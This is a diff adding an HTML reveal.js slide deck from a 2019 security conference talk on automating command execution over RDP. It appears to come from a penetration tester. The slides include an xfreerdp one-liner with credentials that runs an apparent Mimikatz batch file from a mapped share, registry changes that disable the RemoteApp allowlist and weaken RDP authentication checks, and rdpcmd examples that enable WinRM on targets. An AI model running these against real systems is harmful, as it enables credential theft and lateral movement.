@@ -1,0 +1,444 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>RDP automations</title>
+
+		<meta name="description" content="RDP automations">
+		<meta name="author" content="VK">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/diverto.css" id="theme">
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+                        <div class="slides">
+                                <section>
+                                        <img src="images/diverto-logo.png" border="0">
+                                        <h2>RDP automations</h2>
+                                        <h3>When RDP is only hope</h3>
+                                        <h3></h3>
+                                        <p>
+                                                <small>Vlatko Kosturjak (<a href="https://twitter.com/k0st">@k0st</a>), <a href="https://berlinsides.org">BerlinSides 0x7E3, 2nd of June, 2019</a></small>
+                                        </p>
+                                </section>
+
+                                <section>
+                                        <h2>Agenda</h2>
+                                        <ul>
+                                                <li>Introduction</li>
+						<li>Elephants</li>
+                                                <li>RDP</li>
+						<li>Automation</li>
+						<li>Tool</li>
+						<li>Summary</li>
+						<li>Questions and answers</li>
+                                        </ul>
+                                        <p align="right">45 minutes</p>
+                                        <aside class="notes">
+                                                This is what we will cover in this presentation.
+                                        </aside>
+                                </section>
+
+				<section>
+					<section>
+						<h2>About me</h2>
+						<ul>
+							<li>Security Consultant</li>
+							<li>Open source (security) developer</li>
+							<ul>
+								<li>Contributed to many existing...</li>
+								<li>Authored own <a href="https://github.com/kost">https://github.com/kost</a></li>
+							</ul>
+							<li>Finding and exploiting vulnerabilities</li>
+							<ul>
+								<li>Here and there</li>
+							</ul>
+						</ul>
+					</section>
+
+					<section>
+						<ul>
+							<img src="images/docker-alpine-issue.png" />
+							<li>References</li>
+							<ul>
+								<li><a href="https://github.com/gliderlabs/docker-alpine/issues/101">Alpine Docker image security issue</a></li>
+								<li><a href="https://2k18.balccon.org/events/257.html">BalCCon 2k18 link</a></li>
+							</ul>
+						</ul>
+					</section>
+
+				</section>
+
+
+				<section>
+
+				<section>
+					<h2>RDP</h2>
+					<ul>
+						<li>Short</li>
+						<ul>
+							<li>Remote Desktop Protocol</li>
+							<li>Really Do Patch</li>
+						</ul>
+						<li>Desktop "Video"</li>
+						<ul>
+							<li>You get "video" representation</li>
+							<li>no widget info (like X11)</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>RDP bluekeep</h2>
+					<ul>
+						<li>Will not be about bluekeep</li>
+						<li>PoC</li>
+						<ul>
+							<li><a href="https://github.com/zerosum0x0/CVE-2019-0708">https://github.com/zerosum0x0/CVE-2019-0708</a></li>
+						</ul>
+						<li>PoC DoS</li>
+						<ul>
+							<li><a href="https://www.exploit-db.com/exploits/46946">https://www.exploit-db.com/exploits/46946</a></li>
+						</ul>
+						<li>Metasploit aux scanner</li>
+						<ul>
+							<li><a href="https://github.com/rapid7/metasploit-framework/pull/11869">MSF pull request</a></li>
+							<li>no widget info (like X11)</li>
+						</ul>
+					</ul>
+				</section>
+
+				</section>
+
+
+
+				<section>
+
+				<section>
+					<h2>Original problem</h2>
+					<ul>
+						<img src="images/uacnotbad.png" />
+						<li>Article from SANS ISC Diary</li>
+						<ul>
+							<li><a href="https://isc.sans.edu/forums/diary/UAC+is+not+all+that+bad+really/24620/">UAC is not all that bad really</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Problem summary</h2>
+					<ul>
+						<li>Have credentials to bunch of machines</li>
+						<li>SMB/WMI/WINRM/PSREMOTING</li>
+						<ul>
+							<li>Does not work</li>
+							<li>or filtered</li>
+						</ul>
+						<li>RDP open</li>
+						<ul>
+							<li>only hope?</li>
+						</ul>
+					</ul>
+				</section>
+
+				</section>
+
+
+
+				<section>
+
+				<section>
+					<h2>Hmmm. There is RDP app to specify</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+$ xfreerdp | grep -i app
+    /app:||<alias> or <executable path>	Remote application program
+    /app-name:<app name> 	Remote application name for user interface
+    /app-icon:<icon path>	Remote application icon for user interface
+    /app-cmd:<parameters>	Remote application command-line parameters
+    /app-file:<file name>	File to open with remote application
+    /app-guid:<app guid> 	Remote application GUID
+						</code></pre>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Easy. Just specify app!</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+xfreerdp /u:Administrator /p:Password123 /drive:local,/home/digby/pillage /app:cmd.exe /app-cmd:"cmd.exe /k net use X: \\tsclient\local & X: & mimi.bat & logoff" /v:192.168.0.100
+
+						</code></pre>
+						<a href="https://warroom.rsmus.com/scripting-rdp/">https://warroom.rsmus.com/scripting-rdp/</a>
+					</ul>
+				</section>
+
+				<section>
+					<h2>OOps. Does not work</h2>
+					<ul>
+						<li>Connecting with error</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+[08:32:30:562] [2763:2767] [ERROR][com.freerdp.client.x11] - RAIL exec error: execResult=RAIL_EXEC_E_NOT_IN_ALLOWLIST NtError=0x15
+
+						</code></pre>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Solution</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList
+fDisabledAllowList (REG_DWORD)
+1 = disable Allowed list
+0 = enable Allowed list
+						</code></pre>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Solution? Not really.</h2>
+					<ul>
+						<li>Modify registry on target computer</li>
+						<ul>
+						<li>No other ports/services than RDP</li>
+						<li>Only with RDP, but on 100s of machines?</li>
+						</ul>
+						<li>Any better way?</li>
+					</ul>
+				</section>
+
+				</section>
+
+				<section>
+
+				<section>
+					<h2>Why not autoit?</h2>
+					<ul>
+						<li>Anti-virus vendors struggle with it</li>
+						<li>Remember it is "video" protocol</li>
+						<ul>
+							<li>Autoit will not recognize guest "widgets"</li>
+							<li>only MS RDP client widgets </li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Do it Rubber ducky style</h2>
+					<ul>
+						<img src="images/rubberducky.jpg" />
+						<li>Stolen from</li>
+						<ul>
+							<small><li><a href="https://www.codrey.com/arduino-projects/poor-mans-usb-rubber-ducky/">https://www.codrey.com/arduino-projects/poor-mans-usb-rubber-ducky/</a></li></small>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Example Usage</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+run("cmdkey /generic:""" & $servername & """ /user:""" & $username & """ /pass:""" & $password & """")
+run("mstsc /console /v:"& $servername)
+[..]
+; RDP will not receive Window key if RDP session is not maximized
+$wstate=WinSetState ( "[CLASS:TscShellContainerClass]", "", @SW_MAXIMIZE )
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Registry Prerequists</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Terminal Server Client]
+"AuthenticationLevelOverride"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client]
+"ShowShutdownDialog"=dword:00000000
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>rdpcmd</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+rdpcmd <ip> <user> <password> <command> <sleep-after-running>
+
+rdpcmd 192.168.1.1 user password "ipconfig" 0
+
+rdpcmd 192.168.1.1 user password "winrm quickconfig -quiet -force" 5000
+						</code></pre>
+					</ul>
+					<li><a href="https://github.com/kost/rdpcmd">https://github.com/kost/rdpcmd</a></li>
+				</section>
+
+				</section>
+
+
+
+				<section>
+
+				<section>
+					<h2>How about Linux/BSD/Mac?</h2>
+					<ul>
+						<li>Autoit is Windows based solution</li>
+						<li>I need Linux solution</li>
+						<ul>
+							<li>xfreerdp</li>
+							<li>remmina</li>
+							<li>rdesktop</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+				<h2>Example Usage</h2>
+				<ul>
+					<pre><code data-trim contenteditable>	
+xdotool search --all --pid $PID --name $IP
+xdotool windowactivate --sync $WID key 'Super+r' sleep 2 type '$CMD'
+xdotool key --clearmodifiers "Return"
+					</code></pre>
+				</ul>
+			</section>
+
+			<section>
+				<h2>rdpcmd-ruby</h2>
+					<pre><code data-trim contenteditable>	
+sudo apt-get install xdotool remmina
+gem install rdpcmd
+remmina # just to generate global secret
+rdpcmd --help # you'll find your way further
+					</code></pre>
+				<li><a href="https://github.com/kost/rdpcmd-ruby">https://github.com/kost/rdpcmd-ruby</a></li>
+			</section>
+
+			<section>
+				<h2>rdpcmd-ruby</h2>
+					<pre><code data-trim contenteditable>	
+rdpcmd -u user -p password -i 192.168.1.1 -c 'whoami' -x 3
+
+rdpcmd -u user -p password -i 192.168.1.1 -e -c 'winrm quickconfig -quiet -force' -x 5
+					</code></pre>
+				<li><a href="https://github.com/kost/rdpcmd-ruby">https://github.com/kost/rdpcmd-ruby</a></li>
+			</section>
+
+				</section>
+
+
+
+				<section>
+
+				<section>
+					<h2>Future</h2>
+					<ul>
+						<li>Other ways</li>
+						<ul>
+							<li>Interfacing xfreerdp lib directly</li>
+							<li>OCR</li>
+						</ul>
+						<li>OpenSSH server ships with Windows</li>
+						<ul>
+							<li>New exposure</li>
+							<li>New automations</li>
+						</ul>
+					</ul>
+				</section>
+
+				</section>
+
+
+				<section>
+					<h2>Summary</h2>
+					<ul>
+						<li>RDP automation</li>
+						<ul>
+							<li>Possible</li>
+							<li>Limited</li>
+						</ul>
+						<li>Hardening old, introducing new</li>
+						<ul>
+							<li>Hardened windows, RDP only left</li>
+							<li>OpenSSH server</li>
+						</ul>
+					</ul>
+				</section>
+
+
+		                 <section>
+                                        <h3>Thanks on listening</h3>
+                                        <h1>?</h1>
+                                        <h3>Any questions?</h3>
+					<h3><a href="https://twitter.com/k0st">@k0st</a></h3>
+                                </section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// Full list of configuration options available at:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+				slideNumber: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// Optional reveal.js plugins
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
